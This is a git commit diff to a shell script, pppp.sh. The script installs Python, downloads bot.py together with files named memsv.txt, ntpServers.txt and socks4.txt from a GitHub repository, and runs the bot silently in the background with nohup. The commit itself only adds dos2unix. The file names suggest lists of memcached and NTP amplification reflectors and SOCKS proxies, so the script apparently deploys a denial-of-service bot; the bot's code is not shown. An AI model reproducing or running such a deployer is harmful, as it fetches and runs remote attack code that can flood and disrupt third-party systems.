d411232a3a9e74ffb7dae7c36479d7ca90995ffa
umbx-ls14 <leoschlegel11@gmail.com>
2025-05-08 15:26:50 +0200

    pppp.sh

--- pppp.sh
+++ pppp.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 sudo apt update
-sudo apt install python3 python3-pip python3-venv wget -y
+sudo apt install python3 python3-pip python3-venv wget dos2unix -y
 
 python3 -m venv env
 source env/bin/activate
@@ -12,6 +12,8 @@ wget https://raw.githubusercontent.com/umbx-ls14/bot/refs/heads/main/bot.py
 wget https://raw.githubusercontent.com/umbx-ls14/bot/refs/heads/main/memsv.txt
 wget https://raw.githubusercontent.com/umbx-ls14/bot/refs/heads/main/ntpServers.txt
 wget https://raw.githubusercontent.com/umbx-ls14/bot/refs/heads/main/socks4.txt
+
+dos2unix bot.py
 chmod +x bot.py
 
 nohup python bot.py > bot.log 2>&1 &
